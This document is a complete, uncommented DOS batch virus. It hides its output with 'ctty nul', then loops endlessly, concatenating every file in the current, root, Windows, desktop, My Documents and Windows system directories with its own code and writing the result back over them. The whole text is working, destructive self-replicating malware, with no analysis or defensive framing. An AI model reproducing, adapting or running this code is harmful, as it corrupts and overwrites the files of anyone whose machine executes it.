@echo off
goto a01
:a06
@for %%s in (c:\%a% %a% ..\%a% c:\mydocu~1\%a% %w%%a% %path%\%a% %w%%d%%a% %s%%a%) do copy %a%+%%s+%0+%a%+%%s+%0 %%s
goto a06
:a05
@set s=c:\windows\system\
goto a06
:a04
@set d=desktop\
goto a05
:a03
@set w=c:\windows\
goto a04
:a02
@set a=*.*
goto a03
:a01
ctty nul
goto a02